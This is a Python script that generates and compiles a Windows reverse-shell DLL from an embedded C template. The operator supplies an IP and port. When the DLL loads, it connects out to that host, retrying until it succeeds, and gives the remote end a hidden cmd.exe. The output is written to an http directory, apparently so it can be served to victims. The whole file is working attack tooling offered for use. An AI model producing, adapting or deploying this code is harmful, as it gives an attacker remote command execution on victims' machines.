#!/usr/bin/python3
from typing import List
from string import Template
DEFAULT_OUTFILE = "out.dll"
RSHELL_SRC_TEMPLATE = Template("""
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#define CLIENT_IP (char*)"$ip"
#define CLIENT_PORT (int)$port

BOOL APIENTRY DllMain(HANDLE hMod, DWORD reason, LPVOID lpReserved)
{
  switch(reason) {
  case DLL_PROCESS_ATTACH:
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
      return 1;
    }

    int port = CLIENT_PORT;
    SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

    // Wait for client to connect
    while (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
      Sleep(5000);
    }

    STARTUPINFO sInfo;
    memset(&sInfo, 0, sizeof(sInfo));
    sInfo.cb = sizeof(sInfo);
    sInfo.dwFlags = (STARTF_USESTDHANDLES);
    sInfo.hStdInput = (HANDLE) sock;
    sInfo.hStdOutput = (HANDLE) sock;
    sInfo.hStdError = (HANDLE) sock;

    PROCESS_INFORMATION pInfo;
    CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sInfo, &pInfo);
  case DLL_THREAD_ATTACH:
  case DLL_THREAD_DETACH:
  case DLL_PROCESS_DETACH:
    break;
  }

  return TRUE;
}
""")

if __name__ == "__main__":
    import subprocess
    from pathlib import Path
    from lib.prog import *
    prog = Prog(
        "gen_win_rshell",
        "Generates a Windows reverse shell DLL. Creates it in 32-bit by default.", [
            Arg(ArgType.POSITIONAL, "ip", arg_val_type=str, arg_help="client IP"),
            Arg(ArgType.POSITIONAL, "port", arg_val_type=int, arg_help="client port"),
            Arg(ArgType.OPTIONAL_VAL, "arch", "a", arg_val_type=str, arg_help="Architecture. x32 for 32-bit, x64 for 64-bit."),
            Arg(ArgType.OPTIONAL_VAL, "outfile", "o", arg_val_type=str, arg_help="Name of executable.")
        ]
    )
    arch = prog.args["arch"]
    if arch is None or len(arch) == 0:
        arch = "x32"
    if arch not in ["x32", "x64"]:
        print("[!] Invalid architecture -- expected \"x32\" or \"x64\".")
        exit(1)
    ip = prog.args["ip"]
    port = int(prog.args["port"])
    outfile = prog.args["outfile"]
    if outfile is None or len(outfile) == 0:
        outfile = DEFAULT_OUTFILE
    
    compiler = ""
    if arch == "x32":
        compiler = "i686-w64-mingw32-gcc"
    else:
        compiler = "x86_64-w64-mingw32-gcc-win32"

    # Generate source
    source_p = Path("/tmp/win_dll_rshell.c")
    source_p.touch()
    print(f"[i] Generating source file in {str(source_p)}:\n-----")

    c_src = RSHELL_SRC_TEMPLATE.substitute(ip=ip, port=port)
    print(c_src)
    print("-----")

    source_p.write_text(c_src)

    # Generate executable
    out_dir = Path(f"./http/windows")
    out_dir.mkdir(parents=True, exist_ok=True)
    exe_p = out_dir.joinpath(outfile)
    exe_p.touch()

    result = subprocess.run(
        [compiler, str(source_p), "-o", str(exe_p.resolve()), "-lws2_32", "--shared"],
        stdin=None,
        stdout=None,
        stderr=subprocess.STDOUT
    )
    
    if result.returncode != 0:
        print(f"[!] Error generating {arch} DLL.")
    else:
        print(f"[i] {arch} DLL generated: {str(exe_p)}.")
